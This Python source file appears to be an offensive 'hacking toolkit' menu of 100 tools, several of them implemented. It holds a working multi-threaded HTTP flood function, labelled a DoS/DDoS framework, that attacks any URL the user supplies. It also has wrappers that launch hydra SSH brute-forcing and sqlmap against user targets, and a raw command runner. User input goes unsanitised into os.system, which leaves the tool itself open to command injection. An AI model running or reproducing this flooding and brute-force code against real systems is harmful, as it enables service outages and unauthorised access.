import os, subprocess, socket, urllib.request, ssl, hashlib, base64, json, threading, time
from colorama import Fore

VERSION = "v1.0.8"
AUTHOR = "sunveroblox-bit"

TOOLS = {
    1: ["Quick Domain IP Lookup", 1], 2: ["Full DNS Records Lookup", 1], 3: ["Nmap Port Scanner (Open Source)", 1],
    4: ["HTTP Header Inspector", 1], 5: ["SSL Certificate Checker", 1], 6: ["WHOIS Information Lookup", 1],
    7: ["Subnet & CIDR Calculator", 1], 8: ["Reverse PTR Lookup", 1], 9: ["Local Network IP Finder", 1],
    10: ["Public IP Geolocation", 1], 11: ["Custom HTTP Request Sender", 1], 12: ["Random User-Agent Generator", 1],
    13: ["URL Redirect Trace", 1], 14: ["Autonomous System (ASN) Lookup", 1], 15: ["DNS Resolution Latency Test", 1],
    
    16: ["Multi-Hash Generator (MD5/SHA256)", 2], 17: ["Base64 Encoder / Decoder", 2], 18: ["URL Encoder / Decoder", 2],
    19: ["Strong Password Generator", 2], 20: ["JWT Token Decoder", 2], 21: ["Hex Encoder / Decoder", 2],
    22: ["Binary Encoder / Decoder", 2], 23: ["Epoch / Unix Timestamp Tool", 2], 24: ["UUIDv4 Generator", 2],
    25: ["HMAC-SHA256 Generator", 2], 26: ["XOR Cipher Tool", 2], 27: ["ROT13 Cipher", 2],
    28: ["SHA3-256 Advanced Hasher", 2], 29: ["Base32 Encoder / Decoder", 2], 30: ["CRC32 Checksum Calculator", 2],
    
    31: ["Robots.txt Parser", 3], 32: ["Subdomain Enumerator", 3], 33: ["Security Headers Checker", 3],
    34: ["HTML Page Title Grabber", 3], 35: ["Dirsearch Web Path Finder (Open Source)", 3], 36: ["Directory Path Brute-Forcer", 3],
    37: ["HTTP Cookie Inspector", 3], 38: ["Favicon Hash Calculator", 3], 39: ["CMS Detector Heuristic", 3],
    40: ["HTTP OPTIONS Method Checker", 4], 41: ["Open Redirect Checker", 3], 42: ["Clickjacking Auditor", 3],
    43: ["Meta Tags & SEO Extractor", 3], 44: ["Sitemap.xml Parser", 3], 45: ["CORS Policy Analyzer", 3],
    
    46: ["Bayustore22 Python DoS Framework (HTTP Flood)", 4], 47: ["Multi-Threaded HTTP DDoS Stress Tester", 4], 
    48: ["Hydra Brute-Force Wrapper 🔥", 4], 49: ["Hash Dictionary Cracker", 4], 50: ["Netcat Reverse Shell Helper", 4],
    51: ["XSS Payload Generator", 4], 52: ["Sqlmap Injection Framework (Open Source)", 4], 53: ["LFI Path Traversal Payloads", 4],
    54: ["Reverse Shell Generator One-Liners", 4], 55: ["FTP Anonymous Login Tester", 4], 56: ["Telnet Default Credential Tester", 4],
    57: ["SSH Banner Version Auditor", 4], 58: ["DNS Zone Transfer Attack Simulator", 4], 59: ["HTTP Basic Auth Brute-Forcer", 4], 60: ["Web Form Brute-Forcer", 4],
    
    61: ["System Diagnostics Info", 5], 62: ["Ping Sweep (Local Subnet)", 5], 63: ["HTTP Banner Grabbing", 5],
    64: ["TCP Latency Test", 5], 65: ["HTTP Status Code Checker", 5], 66: ["Secure Vault Note Encrypter", 5],
    67: ["Local ARP Cache Viewer", 5], 68: ["Password Strength Analyzer", 5], 69: ["Disk Storage Usage (df)", 5],
    70: ["Active Processes (ps)", 5], 71: ["Environment Variables Viewer", 5], 72: ["Network Interfaces Viewer", 5],
    73: ["Active Socket Listeners (ss)", 5], 74: ["CPU/Memory Monitor", 5], 75: ["Temp File Cleanup Utility", 5],
    
    76: ["Simulated SQLi Response Analyzer", 6], 77: ["Simulated XSS Reflection Tester", 6], 78: ["Command Injection Payload Tester", 6],
    79: ["HTTP Brute-Force Rate Limit Tester", 6], 80: ["Path Traversal / LFI Test Simulator", 6], 81: ["Sensitive Backup & Config File Scanner", 6],
    82: ["Prototype Pollution Test", 6], 83: ["XXE Payload Helper", 6], 84: ["SSRF Payload Helper", 6], 85: ["Insecure Deserialization Helper", 6],
    
    86: ["S3 Bucket Public Exposure Checker", 7], 87: ["CORS Policy Misconfiguration Tester", 7], 88: ["JWT Secret / Algorithm Tester", 7],
    89: ["API Endpoint Health Monitor", 7], 90: ["Termux Local Environment Auditor", 7], 91: ["Local SQLite Database Inspector", 7],
    92: ["Firebase Public Endpoint Checker", 7],
    
    93: ["Wi-Fi Beacon Frame Monitor", 8], 94: ["Bluetooth Device Scanner", 8], 95: ["PE / ELF Binary Header Inspector", 8],
    96: ["Embedded String Extractor Tool", 8], 97: ["File Hash Integrity Baseline Checker", 8], 98: ["Bad Characters Generator for Shellcode", 8],
    99: ["Shellcode NOP Sled Generator", 8], 100: ["Custom Plugin / Script Runner", 8]
}

attack_running = False
attack_counter = 0
counter_lock = threading.Lock()

def dos_worker(url):
    global attack_counter
    while attack_running:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "ZeusKit-DoS/1.0"})
            urllib.request.urlopen(req, timeout=2)
            with counter_lock: attack_counter += 1
        except Exception: pass

def run_dos_attack(title):
    global attack_running, attack_counter
    print(Fore.CYAN + f"\n=== {title} ===")
    target = input(Fore.YELLOW + "Target URL: ").strip()
    if not target.startswith("http"): target = "https://" + target
    threads = int(input(Fore.YELLOW + "Concurrency Threads [30]: ").strip() or 30)
    
    attack_counter = 0
    attack_running = True
    print(Fore.GREEN + f"[*] Launching attack on {target} with {threads} threads. Press Ctrl+C to stop.\n")
    
    for _ in range(threads):
        t = threading.Thread(target=dos_worker, args=(target,))
        t.daemon = True
        t.start()
        
    try:
        while True:
            with counter_lock:
                print(Fore.CYAN + f"\r[+] Requests Sent: {attack_counter}", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        attack_running = False
        print(Fore.RED + "\n[!] Attack halted.")

def execute_tool(tool_id):
    name, cat = TOOLS[tool_id]
    print(Fore.GREEN + f"\n[+] Executing Open-Source Tool #{tool_id}: {name}")
    try:
        if tool_id == 1:
            d = input(Fore.YELLOW + "Enter Domain/URL: ").strip()
            print(Fore.GREEN + f"[+] Resolved IP: {socket.gethostbyname(d)}")
        elif tool_id == 3: # Nmap Wrapper
            target = input(Fore.YELLOW + "Target IP or Domain for Nmap: ").strip()
            print(Fore.YELLOW + "[*] Running open-source tool: nmap -F " + target)
            os.system(f"nmap -F {target}")
        elif tool_id == 4:
            url = input(Fore.YELLOW + "Target URL: ").strip()
            if not url.startswith("http"): url = "https://" + url
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as res:
                print(Fore.CYAN + f"\n--- Status: {res.status} ---")
                for k, v in res.headers.items(): print(Fore.GREEN + f"{k}: {v}")
        elif tool_id == 17:
            mode = input(Fore.YELLOW + "[1] Encode\n[2] Decode\nSelection: ").strip()
            val = input(Fore.YELLOW + "Enter string: ").strip()
            if mode == "1": print(Fore.GREEN + f"[+] Result: {base64.b64encode(val.encode()).decode()}")
            else: print(Fore.GREEN + f"[+] Result: {base64.b64decode(val.encode()).decode()}")
        elif tool_id == 35: # Dirsearch Wrapper
            url = input(Fore.YELLOW + "Target URL for Dirsearch: ").strip()
            print(Fore.YELLOW + "[*] Running open-source tool dirsearch...")
            os.system(f"dirsearch -u {url}")
        elif tool_id == 46 or tool_id == 47:
            run_dos_attack(name)
        elif tool_id == 48:
            target = input(Fore.YELLOW + "Target IP/Domain: ").strip()
            os.system(f"hydra -l admin -P wordlist.txt {target} ssh")
        elif tool_id == 52: # Sqlmap Wrapper
            url = input(Fore.YELLOW + "Target URL with parameter (e.g. http://example.com/page.php?id=1): ").strip()
            print(Fore.YELLOW + "[*] Running open-source tool sqlmap...")
            os.system(f"sqlmap -u '{url}' --batch")
        elif tool_id == 100:
            cmd = input(Fore.YELLOW + "Enter external tool command or script path: ").strip()
            if cmd: os.system(cmd)
        else:
            print(Fore.YELLOW + f"[*] [{name}] wrapper ready. Ensure package is installed via pkg install.")
    except Exception as e:
        print(Fore.RED + f"[!] Execution Error: {e}")
    input(Fore.YELLOW + "\nPress Enter to return...")
